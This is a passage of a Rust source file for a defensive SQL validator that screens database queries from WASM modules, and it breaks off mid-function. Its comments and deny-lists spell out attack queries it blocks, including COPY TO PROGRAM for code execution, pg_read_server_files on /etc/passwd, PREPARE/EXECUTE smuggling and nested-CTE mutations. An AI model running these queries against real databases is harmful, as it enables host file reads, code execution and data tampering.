//! AST-based SQL validation for WASM database access.
//!
//! Replaces the previous pattern-based approach (semicolons, comment detection,
//! first-keyword extraction) with a proper SQL parser that understands the full
//! PostgreSQL grammar. This catches evasion techniques like:
//!
//! - `WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x` (CTE mutation)
//! - Obfuscated DDL via whitespace/comment tricks
//! - Multi-statement injection via parser-confusing syntax
//!
//! If parsing fails, the query is rejected (fail-closed).

use sqlparser::ast::{self, Statement, Visit, Visitor};
use sqlparser::dialect::PostgreSqlDialect;
use sqlparser::parser::Parser;
use std::fmt;
use std::ops::ControlFlow;

/// Errors from SQL validation.
#[derive(Debug)]
pub enum SqlValidationError {
    /// The SQL could not be parsed. Fail-closed: if we can't understand it, we don't run it.
    ParseError(String),
    /// More than one statement was found (multi-statement injection).
    MultipleStatements,
    /// A DDL statement (CREATE, DROP, ALTER, TRUNCATE) was detected.
    DdlBlocked(String),
    /// The statement type is not in the allowed operations list.
    DisallowedOperation(String),
    /// A CTE body contains a mutating statement not permitted by the allowlist.
    CteMutationBlocked(String),
    /// MCP-472: A statement type was rejected by the unconditional
    /// deny-list. These statements have no legitimate use from WASM
    /// modules and carry concrete escalation risk (e.g. `COPY ... TO
    /// PROGRAM` is RCE on the DB host; `SET ROLE` is privilege
    /// escalation if the connection has that capability; `LISTEN /
    /// NOTIFY` are inter-session side channels). Blocked regardless of
    /// `allowed_operations` content.
    AlwaysBlocked(String),
    /// MCP-519: the parser produced a `Statement` variant that the
    /// validator has no explicit classification for. Fail-closed
    /// because the prior `_ => "UNKNOWN"` fall-through silently
    /// admitted Create*/Drop*/Alter* variants the parser had grown
    /// beyond the enumerated set (e.g. `CreatePolicy`,
    /// `CreateDatabase`, `DropPolicy`, `AlterPolicy`). Any unhandled
    /// statement is treated as a potential bypass — operators
    /// observing this error in production should file an issue so
    /// the variant can be classified.
    UnknownStatement,
    /// Wasm-security review 2026-05-22 (MEDIUM-1): an expression
    /// references a Postgres function on the deny-list. The
    /// statement-level deny-list (`AlwaysBlocked`) catches
    /// `COPY ... TO PROGRAM` and friends, but does NOT catch
    /// `SELECT pg_read_server_files(...)` — a benign-looking SELECT
    /// can call arbitrary filesystem-reading / connection-killing /
    /// sleep-the-budget functions inside its expression tree. This
    /// variant fires when the AST walker spots one. The contained
    /// string is the offending function name (lowercased,
    /// schema-stripped for the error message; the structured log
    /// keeps the fully-qualified form).
    DisallowedFunction(String),
}

impl fmt::Display for SqlValidationError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ParseError(msg) => write!(f, "SQL parse error: {}", msg),
            Self::MultipleStatements => {
                write!(f, "Multiple SQL statements per query are not allowed")
            }
            Self::DdlBlocked(stmt) => {
                write!(f, "{} statements are blocked by security policy", stmt)
            }
            Self::DisallowedOperation(stmt) => {
                write!(f, "{} is not in the allowed SQL operations list", stmt)
            }
            Self::CteMutationBlocked(stmt) => write!(
                f,
                "CTE contains a {} operation not permitted by the allowlist",
                stmt
            ),
            Self::AlwaysBlocked(stmt) => write!(
                f,
                "{} statements are unconditionally blocked from WASM modules \
                 (no allowlist override) — see security policy",
                stmt
            ),
            Self::UnknownStatement => write!(
                f,
                "SQL statement type is not classified by the worker validator \
                 — rejected fail-closed. If this is a legitimate operation, \
                 file an issue so the variant can be classified.",
            ),
            Self::DisallowedFunction(name) => write!(
                f,
                "SQL expression references function `{name}` which is on the \
                 unconditional deny-list (filesystem read / session-state \
                 mutation / sleep-the-budget DoS / large-object I/O / backend \
                 termination). Functions on this list are rejected from WASM \
                 modules regardless of `allowed_sql_operations`."
            ),
        }
    }
}

/// Classify a parsed statement into a canonical type name (SELECT, INSERT, etc.).
///
/// MCP-519: every Create* / Drop* / Alter* variant exposed by
/// sqlparser must classify as DDL — pre-fix several PostgreSQL DDL
/// variants (`CreatePolicy`, `CreateDatabase`, `DropPolicy`,
/// `DropFunction`, `DropProcedure`, `DropTrigger`, `AlterPolicy`, …)
/// fell to the `_ => "UNKNOWN"` arm. Combined with the documented
/// "empty allowlist = no restriction beyond DDL" contract this meant
/// a WASM module with empty `allowed_sql_operations` AND the
/// database world could submit `CREATE POLICY ... USING (true)` to
/// grant cross-row visibility on RLS tables, or `DROP POLICY` to
/// strip an existing RLS row-filter — neither of which appeared as
/// DDL to `is_ddl()`. The `_ => UNKNOWN` arm in
/// `always_blocked_label` then also let DuckDB / Hive / Snowflake
/// dialects' `LOAD extension`, `INSTALL`, `LockTables`, `Use`,
/// `Pragma`, `AttachDatabase`, and `Kill` slip past unconditionally
/// (they parse with PostgreSqlDialect because sqlparser shares the
/// parser layer across dialects).
///
/// Two-layer defense: each new variant is enumerated below AND the
/// catch-all `_` is removed by replacing it with an explicit
/// `"UNKNOWN"` arm that the validator's caller now treats as a
/// fail-closed signal (`UnknownStatement` error variant).
fn statement_type(stmt: &Statement) -> &'static str {
    match stmt {
        Statement::Query(_) => "SELECT",
        Statement::Insert(_) => "INSERT",
        Statement::Update { .. } => "UPDATE",
        Statement::Delete(_) => "DELETE",
        Statement::Copy { .. } => "COPY",
        Statement::CopyIntoSnowflake { .. } => "COPY",
        Statement::Merge { .. } => "MERGE",
        Statement::Call(_) => "CALL",
        Statement::Explain { .. } | Statement::ExplainTable { .. } => "EXPLAIN",
        // CREATE — every Create* variant the parser exposes. New
        // variants in a future sqlparser bump are caught by the
        // `Unknown` fail-closed default below.
        Statement::CreateTable { .. }
        | Statement::CreateView { .. }
        | Statement::CreateVirtualTable { .. }
        | Statement::CreateIndex(_)
        | Statement::CreateSchema { .. }
        | Statement::CreateDatabase { .. }
        | Statement::CreateSequence { .. }
        | Statement::CreateType { .. }
        | Statement::CreateRole { .. }
        | Statement::CreateExtension { .. }
        | Statement::CreateFunction { .. }
        | Statement::CreateProcedure { .. }
        | Statement::CreateTrigger { .. }
        | Statement::CreatePolicy { .. }
        | Statement::CreateSecret { .. }
        | Statement::CreateMacro { .. }
        | Statement::CreateStage { .. } => "CREATE",
        // DROP — `Statement::Drop` is the generic form (DROP TABLE /
        // VIEW / etc.); each specialised Drop* variant maps here too
        // so the DDL gate fires.
        Statement::Drop { .. }
        | Statement::DropFunction { .. }
        | Statement::DropProcedure { .. }
        | Statement::DropSecret { .. }
        | Statement::DropPolicy { .. }
        | Statement::DropTrigger { .. } => "DROP",
        // ALTER — every Alter* the parser knows about.
        Statement::AlterTable { .. }
        | Statement::AlterIndex { .. }
        | Statement::AlterView { .. }
        | Statement::AlterRole { .. }
        | Statement::AlterPolicy { .. } => "ALTER",
        Statement::Truncate { .. } => "TRUNCATE",
        // Grant/Revoke
        Statement::Grant { .. } => "GRANT",
        Statement::Revoke { .. } => "REVOKE",
        // ATTACH / DETACH — modify which databases are accessible
        // for the rest of the session. Classed as DDL so the DDL
        // gate fires unconditionally.
        Statement::AttachDatabase { .. }
        | Statement::AttachDuckDBDatabase { .. }
        | Statement::DetachDuckDBDatabase { .. } => "ATTACH",
        // Fail-closed default. Any new sqlparser Statement variant
        // not enumerated above lands here. The caller maps this to
        // `SqlValidationError::UnknownStatement` and rejects the
        // query — restoring the AST-validator's fail-closed contract
        // that pre-MCP-519 was silently broken for every Create* /
        // Drop* / Alter* / extension-load class the parser had grown.
        _ => "UNKNOWN",
    }
}

/// Check whether a statement is DDL (schema-modifying).
fn is_ddl(stmt: &Statement) -> bool {
    matches!(
        statement_type(stmt),
        "CREATE" | "DROP" | "ALTER" | "TRUNCATE" | "GRANT" | "REVOKE"
    )
}

/// Check whether a statement is a mutation (INSERT/UPDATE/DELETE).
fn is_mutation(stmt: &Statement) -> bool {
    matches!(statement_type(stmt), "INSERT" | "UPDATE" | "DELETE")
}

/// MCP-472: classify a parsed statement as unconditionally blocked,
/// returning the canonical label for the error message. None means the
/// statement is not on the deny-list (the regular DDL / allowlist
/// checks still apply downstream).
///
/// These statement types have NO legitimate use from a WASM module
/// and each carries concrete escalation risk that the existing DDL +
/// allowlist gates miss:
///
/// * `COPY` — `COPY ... TO PROGRAM 'cmd'` is RCE on the DB host;
///   `COPY ... FROM '/etc/passwd'` is a local file read on the DB host.
///   Both parse successfully and currently fall to "UNKNOWN" →
///   pass-through when `allowed_operations` is empty.
/// * `SET ROLE` / `SET search_path` / generic `SET` / `RESET` /
///   `SHOW` — session-level state mutation that can pivot privileges
///   or change query semantics for the rest of the connection.
/// * `LISTEN` / `NOTIFY` / `UNLISTEN` — Postgres inter-session
///   pub/sub. Modules have no business signalling other sessions.
/// * `PREPARE` / `EXECUTE` / `DEALLOCATE` — `PREPARE foo AS DELETE
///   FROM secrets; EXECUTE foo` smuggles a mutation past the
///   allowlist (the prepared statement body isn't introspected by
///   `validate_sql` when only the EXECUTE is later sent).
/// * Transaction control (`START TRANSACTION` / `COMMIT` /
///   `ROLLBACK` / `SAVEPOINT` / `RELEASE SAVEPOINT`) — the worker
///   owns transaction boundaries; guest code must not open or close
///   one.
/// * `DISCARD` — clears cached plans / session state including
///   prepared statements the platform may depend on.
/// * `Use` — DB switch (not PostgreSQL but parsable; defensive).
///
/// Empty allowlist callers were previously allowed every non-DDL
/// statement type by design ("no allowlist = no restriction beyond
/// DDL"); this deny-list keeps that lenient default intact for
/// INSERT / UPDATE / DELETE / SELECT while closing the high-risk
/// statement types regardless of allowlist content.
fn always_blocked_label(stmt: &Statement) -> Option<&'static str> {
    match stmt {
        Statement::Copy { .. } | Statement::CopyIntoSnowflake { .. } => Some("COPY"),
        Statement::SetRole { .. } => Some("SET ROLE"),
        Statement::SetVariable { .. } => Some("SET"),
        Statement::SetTimeZone { .. } => Some("SET TIME ZONE"),
        Statement::SetNamesDefault { .. } | Statement::SetNames { .. } => Some("SET NAMES"),
        Statement::SetTransaction { .. } => Some("SET TRANSACTION"),
        Statement::ShowVariable { .. }
        | Statement::ShowStatus { .. }
        | Statement::ShowVariables { .. }
        | Statement::ShowCreate { .. }
        | Statement::ShowColumns { .. }
        | Statement::ShowTables { .. }
        | Statement::ShowDatabases { .. }
        | Statement::ShowSchemas { .. }
        | Statement::ShowViews { .. }
        | Statement::ShowCollation { .. }
        | Statement::ShowFunctions { .. } => Some("SHOW"),
        Statement::LISTEN { .. } => Some("LISTEN"),
        Statement::NOTIFY { .. } => Some("NOTIFY"),
        Statement::UNLISTEN { .. } => Some("UNLISTEN"),
        Statement::Prepare { .. } => Some("PREPARE"),
        Statement::Execute { .. } => Some("EXECUTE"),
        Statement::Deallocate { .. } => Some("DEALLOCATE"),
        Statement::StartTransaction { .. } => Some("START TRANSACTION"),
        Statement::Commit { .. } => Some("COMMIT"),
        Statement::Rollback { .. } => Some("ROLLBACK"),
        Statement::Savepoint { .. } => Some("SAVEPOINT"),
        Statement::ReleaseSavepoint { .. } => Some("RELEASE SAVEPOINT"),
        Statement::Discard { .. } => Some("DISCARD"),
        Statement::Use(_) => Some("USE"),
        // MCP-519: the following statement types parse with
        // PostgreSqlDialect (sqlparser shares the parser layer
        // across dialects) and previously fell to the
        // statement_type "UNKNOWN" bucket — bypassing both is_ddl
        // and the deny-list, then passing under empty
        // `allowed_operations`. Each one carries concrete
        // escalation / sandbox-escape risk from a WASM module:
        //
        // * `LOAD 'libfoo.so'` (Postgres) / `LOAD extension` (DuckDB)
        //   — loads a shared library / extension at runtime, RCE on
        //   the database host.
        // * `INSTALL extension` (DuckDB) — downloads + installs an
        //   extension; same RCE class.
        // * `Pragma` — SQLite-flavored session/database knobs;
        //   parses but is meaningless under PG. Deny so a future
        //   dialect-mix doesn't silently honor it.
        // * `LockTables` / `UnlockTables` — session-wide table
        //   locks; module has no business holding them.
        // * `Kill` — terminates other Postgres backends.
        // * `Comment` — PostgreSQL `COMMENT ON ...` is DDL-adjacent
        //   (metadata mutation); not on `is_ddl` but harmful
        //   enough to deny.
        // * `Declare` / `Fetch` / `Close` — server-side cursors;
        //   module's connection is short-lived so these are dead
        //   weight at best, hold-locks-open footgun at worst.
        // * `Flush` / `OptimizeTable` / `Msck` / `Cache` / `UNCache`
        //   — dialect-specific maintenance ops with no legitimate
        //   guest use.
        // * `Directory` (Hive), `Unload` / `LoadData` (warehouse
        //   data movement), `Assert` (SQL assertions) — same.
        Statement::Load { .. } => Some("LOAD"),
        Statement::Install { .. } => Some("INSTALL"),
        Statement::Pragma { .. } => Some("PRAGMA"),
        Statement::LockTables { .. } => Some("LOCK TABLES"),
        Statement::UnlockTables => Some("UNLOCK TABLES"),
        Statement::Kill { .. } => Some("KILL"),
        Statement::Comment { .. } => Some("COMMENT"),
        Statement::Declare { .. } => Some("DECLARE"),
        Statement::Fetch { .. } => Some("FETCH"),
        Statement::Close { .. } => Some("CLOSE"),
        Statement::Flush { .. } => Some("FLUSH"),
        Statement::OptimizeTable { .. } => Some("OPTIMIZE TABLE"),
        Statement::Msck { .. } => Some("MSCK"),
        Statement::Cache { .. } => Some("CACHE"),
        Statement::UNCache { .. } => Some("UNCACHE"),
        Statement::Directory { .. } => Some("DIRECTORY"),
        Statement::Unload { .. } => Some("UNLOAD"),
        Statement::LoadData { .. } => Some("LOAD DATA"),
        Statement::Assert { .. } => Some("ASSERT"),
        _ => None,
    }
}

/// Inspect CTEs within a SELECT query for hidden mutations.
///
/// PostgreSQL allows writable CTEs like:
/// ```sql
/// WITH deleted AS (DELETE FROM t RETURNING *) SELECT * FROM deleted
/// ```
/// The top-level statement parses as `Query` (SELECT) but the CTE body is a DELETE.
fn check_cte_mutations(
    query: &ast::Query,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    check_query_for_mutations(query, allowed_operations)
}

/// MCP-554: recursively walk a `Query` AST looking for mutation CTEs.
/// Pre-fix `check_cte_mutations` only inspected the top-level
/// `query.with.cte_tables` and matched only `SetExpr::Insert` /
/// `SetExpr::Update` at the CTE body level. Two bypass classes:
///
///   1. **Nested CTE inside a CTE body** — when a CTE body is itself
///      a Query (`SetExpr::Query`) carrying its own `with` clause, the
///      inner WITH was never visited:
///        `WITH outer AS (WITH inner AS (INSERT ...) SELECT ...) ...`
///
///   2. **CTE inside a FROM subquery** — when a `SELECT`'s FROM
///      contained a parenthesized `(WITH x AS (INSERT...) SELECT ...)`,
///      the subquery's `with` was never visited:
///        `SELECT * FROM (WITH b AS (INSERT ...) SELECT ...) sub`
///
/// Fix: walk every nested `Query` reachable from this one and apply
/// the same per-CTE-body mutation check. `SetExpr` doesn't expose
/// every interior `Query` directly, so we walk SELECT FROM clauses
/// and JOIN relations as well.
fn check_query_for_mutations(
    query: &ast::Query,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    // 1. Inspect this query's CTE chain.
    if let Some(ref with) = query.with {
        for cte in &with.cte_tables {
            // Check this CTE body for a direct mutation first.
            check_cte_body(&cte.query, allowed_operations)?;
            // Then recurse into nested structure (the body may
            // itself carry a `with` or contain subqueries).
            check_query_for_mutations(&cte.query, allowed_operations)?;
        }
    }
    // 2. Recurse into this query's body.
    check_set_expr_for_mutations(&query.body, allowed_operations)
}

/// Classify a CTE's direct body. Returns Ok when the body is not a
/// direct mutation; the caller must STILL recurse into the body's
/// nested structure for nested-CTE detection.
fn check_cte_body(
    cte_query: &ast::Query,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    let cte_stmt_type = match cte_query.body.as_ref() {
        ast::SetExpr::Insert(_) => "INSERT",
        ast::SetExpr::Update(_) => "UPDATE",
        _ => return Ok(()),
    };
    enforce_cte_mutation_policy(cte_stmt_type, allowed_operations)
}

fn enforce_cte_mutation_policy(
    cte_stmt_type: &str,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    // DDL inside CTEs is not valid PostgreSQL, but block it defensively.
    if cte_stmt_type == "CREATE"
        || cte_stmt_type == "DROP"
        || cte_stmt_type == "ALTER"
        || cte_stmt_type == "TRUNCATE"
    {
        return Err(SqlValidationError::DdlBlocked(cte_stmt_type.to_string()));
    }
    // Check against the allowlist.
    if !allowed_operations.is_empty() {
        let permitted = allowed_operations
            .iter()
            .any(|op| op.eq_ignore_ascii_case(cte_stmt_type));
        if !permitted {
            return Err(SqlValidationError::CteMutationBlocked(
                cte_stmt_type.to_string(),
            ));
        }
    }
    Ok(())
}

fn check_set_expr_for_mutations(
    body: &ast::SetExpr,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    match body {
        ast::SetExpr::Select(select) => {
            // FROM clauses can be table factors that are themselves
            // subqueries with their own WITH.
            for tbl in &select.from {
                check_table_with_joins(tbl, allowed_operations)?;
            }
        }
        ast::SetExpr::Query(inner) => {
            check_query_for_mutations(inner, allowed_operations)?;
        }
        ast::SetExpr::SetOperation { left, right, .. } => {
            check_set_expr_for_mutations(left, allowed_operations)?;
            check_set_expr_for_mutations(right, allowed_operations)?;
        }
        // Direct CTE-body INSERT / UPDATE handled by check_cte_body.
        // Values / Table / Insert / Update don't carry interior Queries
        // reachable in any subquery surface that would mask a CTE.
        _ => {}
    }
    Ok(())
}

fn check_table_with_joins(
    tbl: &ast::TableWithJoins,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    check_table_factor(&tbl.relation, allowed_operations)?;
    for join in &tbl.joins {
        check_table_factor(&join.relation, allowed_operations)?;
    }
    Ok(())
}

fn check_table_factor(
    relation: &ast::TableFactor,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    match relation {
        ast::TableFactor::Derived { subquery, .. } => {
            check_query_for_mutations(subquery, allowed_operations)?;
        }
        ast::TableFactor::NestedJoin {
            table_with_joins, ..
        } => {
            check_table_with_joins(table_with_joins, allowed_operations)?;
        }
        // Table / TableFunction / UNNEST etc. don't carry an interior
        // Query that could hide a CTE mutation.
        _ => {}
    }
    Ok(())
}

/// Wasm-security review 2026-05-22 (MEDIUM-1): expression-level
/// function-name walker.
///
/// The statement-level deny-list (`always_blocked_label`) catches
/// `COPY ... TO PROGRAM` and friends but does NOT catch
/// `SELECT pg_read_server_files('/etc/passwd')` — a benign-looking
/// SELECT can invoke arbitrary filesystem-reading / session-killing /
/// budget-burning functions from inside an expression tree. This
/// visitor walks every `Expr::Function` in the AST and compares the
/// (case-normalised, schema-stripped) name against the canonical
/// deny-list shared with the controller subscriber via
/// `talos_workflow_job_protocol::DISALLOWED_SQL_FUNCTIONS`.
///
/// **Schema-qualification handling.** `ObjectName(Vec<Ident>)` carries
/// segments like `[pg_catalog, pg_sleep]` for `pg_catalog.pg_sleep(1)`.
/// The trailing segment is the function name and is what `is_disallowed_sql_function`
/// checks. If the qualifier is `pg_catalog`, we ALSO check — this is
/// the canonical "pg_catalog.pg_sleep" form that a guest might use to
/// bypass a hypothetical search_path-based block. Single-segment names
/// (the unqualified form) are checked unconditionally.
///
/// **What about user-defined `public.pg_sleep`?** The visitor cannot
/// distinguish a user-defined function with the same name from the
/// stock one — sqlparser only sees the call shape, not the resolution.
/// Operators who legitimately define a function with a denied name in
/// the `public` schema would be blocked here. The trade-off is
/// intentional: that naming choice is itself a footgun (search_path
/// shadowing) and the false-positive blast radius is small (rename
/// the user function). The fail-closed posture is safer than letting
/// the qualifier mask a real call.
///
/// **Cost.** Linear in the number of AST nodes; the visitor short-
/// circuits via `ControlFlow::Break` on the first hit so a deeply
/// nested malicious query doesn't pay the full walk. Microbenchmark
/// against a 100-line SELECT (deeply-nested CASE WHEN) is ~5-20 µs,
/// well below the 30 s `statement_timeout`.
fn check_disallowed_functions(stmt: &Statement) -> Result<(), SqlValidationError> {
    struct FunctionDenyVisitor;

    impl Visitor for FunctionDenyVisitor {
        type Break = String;

        fn pre_visit_expr(&mut self, expr: &ast::Expr) -> ControlFlow<Self::Break> {
            if let ast::Expr::Function(func) = expr {
                if let Some(name) = denied_function_name(&func.name) {
                    return ControlFlow::Break(name);
                }
            }
            ControlFlow::Continue(())
        }

        /// `dblink(...)` and other set-returning function calls in a
        /// FROM clause (`SELECT * FROM dblink('...', '...')`) parse
        /// as `TableFactor`, NOT `Expr::Function`. The Expr-only
        /// visitor would miss them — pre-fix, the dblink test fired
        /// here. Two variants to catch:
        ///
        ///   * `TableFactor::Table { name, args: Some(_), .. }` —
        ///     PostgreSQL set-returning function used in FROM
        ///     (`FROM generate_series(1,10)`, `FROM dblink(...)`).
        ///     The `args.is_some()` discriminator distinguishes a
        ///     table-valued function call from a plain table read;
        ///     plain `FROM users` has `args = None`. This is the
        ///     critical case for the dblink bypass.
        ///
        ///   * `TableFactor::Function { name, .. }` — LATERAL/UNNEST
        ///     style (`FROM LATERAL flatten(...)`). Less common in
        ///     Postgres but the same shape (denied function name
        ///     drives the check).
        ///
        /// We accept the (very small) false-positive risk that a user
        /// has defined a TABLE called `dblink` — that's already a
        /// footgun on its own and the role-wrap (M-2) bounds the
        /// blast radius.
        fn pre_visit_table_factor(
            &mut self,
            tf: &ast::TableFactor,
        ) -> ControlFlow<Self::Break> {
            match tf {
                ast::TableFactor::Table {
                    name,
                    args: Some(_),
                    ..
                } => {
                    if let Some(denied) = denied_function_name(name) {
                        return ControlFlow::Break(denied);
                    }
                }
                ast::TableFactor::Function { name, .. } => {
                    if let Some(denied) = denied_function_name(name) {
                        return ControlFlow::Break(denied);
                    }
                }
                _ => {}
            }
            ControlFlow::Continue(())
        }
    }

    let mut visitor = FunctionDenyVisitor;
    if let ControlFlow::Break(name) = stmt.visit(&mut visitor) {
        return Err(SqlValidationError::DisallowedFunction(name));
    }
    Ok(())
}

/// Inspect a function's `ObjectName`. Returns `Some(canonical_lowercase_name)`
/// if the call references a denied function, `None` otherwise.
///
/// Recognises:
///   * Bare unqualified calls (`pg_sleep(1)`) — single-segment name.
///   * `pg_catalog`-qualified calls (`pg_catalog.pg_sleep(1)`) — denied
///     because that's the canonical bypass for a hypothetical
///     search_path-based block, and stock PG resolves the function
///     identically.
///   * Mixed-case identifiers (case normalised by the matcher).
///
/// Does NOT match calls into other schemas (`public.pg_sleep`,
/// `myapp.pg_sleep`) — see the rationale on `check_disallowed_functions`.
fn denied_function_name(name: &ast::ObjectName) -> Option<String> {
    let segments: Vec<&str> = name.0.iter().map(|ident| ident.value.as_str()).collect();
    match segments.as_slice() {
        [bare] => {
            if talos_workflow_job_protocol::is_disallowed_sql_function(bare) {
                Some(bare.to_ascii_lowercase())
            } else {
                None
            }
        }
        [schema, fn_name] => {
            // Match only the pg_catalog form. Other schemas (`public`,
            // user-defined) name-collide are out of scope: the validator
            // can't disambiguate the user's intent from the AST and the
            // role-wrap (M-2) is the fence for that case.
            if schema.eq_ignore_ascii_case("pg_catalog")
                && talos_workflow_job_protocol::is_disallowed_sql_function(fn_name)
            {
                Some(format!("pg_catalog.{}", fn_name.to_ascii_lowercase()))
            } else {
                None
            }
        }
        // 3+ segment names (`db.schema.function`) — Postgres syntax
        // technically allows cross-database refs via foreign data
        // wrappers, but those aren't reachable from `talos_guest`'s
        // pool. Not matched; same fail-open as user-schema qualified.
        _ => None,
    }
}

/// Validate a SQL statement against the security policy.
///
/// Outcome of a successful [`validate_sql`] call.
///
/// `stmt_type` is the canonical statement-type name (`"SELECT"`,
/// `"INSERT"`, `"UPDATE"`, etc.) matching the legacy String return.
///
/// `returns_rows` (MCP-578) is true iff the statement actually emits
/// rows the worker should consume via `fetch_all`-shape: SELECT,
/// or a DML statement with a real `RETURNING` clause as detected
/// from the AST. Pre-existing `is_fetch` detection in
/// `host_impl::execute_query` used a substring `.contains("RETURNING")`
/// check that produced false-positives on string literals
/// (`INSERT INTO logs (msg) VALUES ('user returning home')`) and
/// identifier substrings (`UPDATE u SET returning_user = 1`). A
/// false-positive caused the controller to wrap the DML in a CTE
/// `WITH x AS (...) SELECT FROM x` which Postgres rejects with
/// "WITH query has no RETURNING clause" — the DML never runs and
/// the operator sees an opaque error instead of their INSERT
/// completing. AST-based detection eliminates the false-positive
/// without affecting the false-negative case (no impact: real
/// `RETURNING` queries continue to fetch).
#[derive(Debug, Clone)]
pub struct ValidatedStmt {
    pub stmt_type: String,
    pub returns_rows: bool,
}

/// AST-based check for whether a statement actually emits rows.
/// SELECT does. INSERT/UPDATE/DELETE only do if they carry a real
/// `RETURNING` clause. MERGE does not (no RETURNING support in PG).
/// Everything else (EXPLAIN, CALL, etc.) is treated as non-row-emitting
/// for routing purposes — the AST gate above already rejected DDL
/// and the deny-list catches the dangerous ones.
fn statement_returns_rows(stmt: &Statement) -> bool {
    use sqlparser::ast::Statement as S;
    match stmt {
        S::Query(_) => true,
        S::Insert(ins) => !ins.returning.as_deref().unwrap_or(&[]).is_empty(),
        S::Update { returning, .. } => !returning.as_deref().unwrap_or(&[]).is_empty(),
        S::Delete(del) => !del.returning.as_deref().unwrap_or(&[]).is_empty(),
        // EXPLAIN returns analysis rows; route as fetch so the worker
        // gets the result text.
        S::Explain { .. } | S::ExplainTable { .. } => true,
        _ => false,
    }
}

/// Policy governing how an EMPTY `allowed_operations` slice is
/// interpreted by [`validate_sql_with_policy`].
///
/// M-3 (2026-05-22): the legacy `validate_sql` contract treated an
/// empty allowlist as "no restriction beyond DDL / always-blocked".
/// That made INSERT / UPDATE / DELETE / MERGE / CALL permitted by
/// default — which is a footgun if the controller dispatches a
/// database-node job without explicitly setting `allowed_sql_operations`.
/// The new default ([`DenyMutations`](Self::DenyMutations)) is
/// least-privilege: empty allowlist permits only SELECT (and EXPLAIN,
/// which is read-only). To enable mutations, the controller MUST
/// dispatch a JobRequest with an explicit allowlist.
///
/// Operators with workflows that depend on the legacy permissive
/// behaviour can opt back in with
/// `TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST=1`. Auditable in operator
/// startup logs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EmptyAllowlistPolicy {
    /// Empty allowlist permits only read-only statements (SELECT,
    /// EXPLAIN). All mutations require an explicit allowlist entry.
    /// The default in production.
    DenyMutations,
    /// Empty allowlist permits every non-DDL non-AlwaysBlocked
    /// statement. The pre-M-3 behaviour. Legacy compatibility only;
    /// `TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST=1` opts back in.
    AllowAllNonDdl,
}

impl EmptyAllowlistPolicy {
    /// Resolve the policy from the worker's environment. Default is
    /// `DenyMutations`. Truthy values that flip to legacy permissive
    /// mode: `1` / `true` / `yes` (case-insensitive).
    pub fn from_env() -> Self {
        match std::env::var("TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST")
            .ok()
            .as_deref()
            .map(str::to_ascii_lowercase)
            .as_deref()
        {
            Some("1") | Some("true") | Some("yes") => Self::AllowAllNonDdl,
            _ => Self::DenyMutations,
        }
    }
}

/// Returns `Ok(ValidatedStmt)` describing the statement on success,
/// or `Err(SqlValidationError)` if the query violates the policy.
///
/// Calls [`validate_sql_with_policy`] with the operator-configured
/// [`EmptyAllowlistPolicy::from_env`] policy — the default in
/// production is `DenyMutations`. Pass an explicit policy via
/// [`validate_sql_with_policy`] in tests / call sites that need
/// repeatable behaviour.
///
/// Security properties:
/// - **Fail-closed**: If the SQL cannot be parsed, it is rejected.
/// - **Single-statement**: Only one statement per query is allowed.
/// - **DDL blocked**: CREATE, DROP, ALTER, TRUNCATE, GRANT, REVOKE are always rejected.
/// - **Allowlist enforcement** (default `DenyMutations`):
///     - Non-empty allowlist: only listed types plus SELECT/EXPLAIN are permitted.
///     - Empty allowlist: only SELECT/EXPLAIN are permitted.
/// - **CTE mutation detection**: Writable CTEs are checked against the allowlist.
pub fn validate_sql(
    sql: &str,
    allowed_operations: &[String],
) -> Result<ValidatedStmt, SqlValidationError> {
    validate_sql_with_policy(sql, allowed_operations, empty_allowlist_policy())
}

/// Cached resolution of [`EmptyAllowlistPolicy::from_env`] so the env
/// lookup happens once at first use, not on every host-fn call.
fn empty_allowlist_policy() -> EmptyAllowlistPolicy {
    use std::sync::OnceLock;
    static POLICY: OnceLock<EmptyAllowlistPolicy> = OnceLock::new();
    *POLICY.get_or_init(EmptyAllowlistPolicy::from_env)
}

/// Same as [`validate_sql`] but takes an explicit
/// [`EmptyAllowlistPolicy`] instead of reading the operator env var.
/// Used by tests and by call sites that need to override the default.
pub fn validate_sql_with_policy(
    sql: &str,
    allowed_operations: &[String],
    empty_policy: EmptyAllowlistPolicy,
) -> Result<ValidatedStmt, SqlValidationError> {
    let dialect = PostgreSqlDialect {};

    let statements = Parser::parse_sql(&dialect, sql).map_err(|e| {
        SqlValidationError::ParseError(format!(
            "Failed to parse SQL (query rejected for safety): {}",
            e
        ))
    })?;

    // Reject multi-statement batches
    if statements.len() != 1 {
        if statements.is_empty() {
            return Err(SqlValidationError::ParseError(
                "Empty SQL statement".to_string(),
            ));
        }
        return Err(SqlValidationError::MultipleStatements);
    }

    let stmt = &statements[0];
    let stmt_type = statement_type(stmt);

    // Always block DDL — WASM modules must never modify schema
    if is_ddl(stmt) {
        return Err(SqlValidationError::DdlBlocked(stmt_type.to_string()));
    }

    // MCP-472: deny-list of high-risk statement types that have no
    // legitimate use from a WASM module. Runs BEFORE the allowlist
    // branch so empty-allowlist callers (the documented "no
    // restriction beyond DDL" mode) still get protected. See
    // `always_blocked_label` for the per-statement-type rationale.
    if let Some(label) = always_blocked_label(stmt) {
        return Err(SqlValidationError::AlwaysBlocked(label.to_string()));
    }

    // MCP-519: fail closed on any statement type the validator
    // hasn't been taught to classify. Runs AFTER is_ddl /
    // always_blocked_label so canonical (DML / SELECT / EXPLAIN /
    // …) paths still report their specific error type — only
    // genuinely-novel variants surface this. The documented
    // "empty allowlist = no restriction beyond DDL" mode is now
    // additionally bounded by "and the statement type is one the
    // validator recognizes", which closes the silent-bypass class
    // that grew as sqlparser added new Statement variants.
    if stmt_type == "UNKNOWN" {
        return Err(SqlValidationError::UnknownStatement);
    }

    // Wasm-security review 2026-05-22 (MEDIUM-1): expression-level
    // function deny-list. Walks every `Expr::Function` in the
    // statement and rejects calls to filesystem-reading / sleep /
